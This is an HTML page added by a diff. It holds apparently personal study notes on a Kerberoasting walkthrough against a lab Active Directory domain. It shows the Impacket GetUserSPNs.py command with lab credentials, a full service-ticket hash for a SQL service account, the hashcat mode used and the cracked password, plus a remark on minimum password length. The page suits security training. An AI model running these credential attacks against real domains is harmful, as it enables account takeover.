@@ -1,0 +1,45 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Kerberoasting Walkthrough</title>
+</head><body><img height="303" src="kebers.png" width="750"/><br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.17.129 -request<br/>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+ServicePrincipalName          Name    MemberOf                           PasswordLastSet   LastLogon <br/>
+-------------------------------------- ---------- ----------------------------------------------------------- ------------------- ---------<br/>
+Hydra-DC/SQLService.MARVEL.local:60111 SQLService CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local 2023-01-31 20:34:32 &lt;never&gt;  <br/>
+<br/>
+<br/>
+<br/>
+$krb5tgs$23$*SQLService$MARVEL.LOCAL$Hydra-DC/SQLService.MARVEL.local~60111*$976e525db343902934101a7aa1c0637a$ce20118c24b92dc3f337217d67b374e375e7240d8cff2ffdf2d7c6cad069ea62d4add1af594acd72c70b622312905da53d6eb6f1c30231e6f7<br/>
+0ac4a00dc861b577c74a607f5e8f5b460160d7c9823b38178055ff37f82175ef87e82f71b26d659e14d690326e21a8ff2da444563cf29d0bffaf4<br/>
+1364a45fb08315f591b04a8de9767c1895eb2f793c4927945d688686320bf4e17d7ff8bbb2dee63749be71bbd76c129b9a86bfae198bad0cc237<br/>
+de655dad900bd43ae93b8d929ae294ab6461d671f07a978d9f5afa1ea30ffce816d96b3336076928a88fb1773f63bb7124bf9157e26636a13be04<br/>
+8924d83c94f89eb79216afe495c7bd7d4e6e7ca22c2e762274521203152ce72d664906598f9a2149ec3c418de52433fe6d710e92059dfca5ba3c<br/>
+054dc59f08cedf4b6cd7d27caa76d665e39d4b1b243880a0b97b27ac0dcdfc8def94550a0489d8bfe642e5b4246d6b8162b493ec5a84a22c052aa<br/>
+1a785f016f81357bbf9d76e54c05a36c9a1ed9d7830c223dce203095c60f5d2993095e9540fba9abf568cd71e062841cab330d61bffd9066fc5ec84<br/>
+788606728b2828263b20bcfdb5de83eba18a666e40843131f3465658bf37329de4b406e8d67b28a16a882bd1358d67cb0c2dbc9f847bc5d0561e<br/>
+9b0fb010c671de8ce1ae085d96680568595c39c030ef928ce0317fc8972cf50421f1511c1da8839650765e46cd68755bfc7f7a81682964188f50af22<br/>
+10ddfd0e0339f5b3ddf12199d75350056bcbdd5ae0ade8d7d61512ffffae92e11873b15ce9194dac10c5a44e8b9f6f99e8ebaef5c5303231d4a1ac708<br/>
+67abf3d0fc37d830b0b390d919f26936447e94b9c423e37aa63df1269fade67047f191ed6768cfa48dfc19bb5c106450bf10e7f7b62ef4edec1d16475<br/>
+66f9fb2c294f1d6d7ec4bc55afd7fbd6f06eb7ec29c97d0d3d4442cbf5678bdf5b6a6f6135cb358a95e964d8f3e7453d845600c3417621f1962442ef41a<br/>
+1c89073f4cdf42f37d5e29771f7b23e6d247de08eb5549865097a5f2cfb449b86f018ce251c45bbf224cb6c07d75fbd750f105bef574eadac2dcbd68be1<br/>
+89b3b8d3ca0784bc2b0fe3099bec34bc9a7b13548540b87df13e7e5a37e027339469c0111ef4626a882fd166481b537bc9f424178ec55b389f0a8c83<br/>
+8712bd67cf96c559a902cf6cb908c4eb8d8c83504ed62571dbb0303fd9302886c7c70c97553e3c97d632626aa205afb25a173b8c205061c4a62cbe3<br/>
+0b67e113f500b0c7ba6e85c0a49767b5b0775592f1f2ed668cfebb61ee5dcada0954c1b8d0b7f291f6408<br/>
+<br/>
+<br/>
+<img height="233" src="image.png" width="700"/><br/>
+<span style="background-color: #ffff99"><b>Have to use Module 13100 for this</b></span><br/>
+<br/>
+<img height="372" src="image 2.png" width="700"/><br/>
+<b>Password:MYpassword123#</b><br/>
+<br/>
+As the mentor said that 14 character is like the minimum that he recommends as it was simly cracked by Rockyou.txt which is considered the base file for cracking password.<br/>
+We have found the SQL service password <br/>
+<br/>
+</body></html>
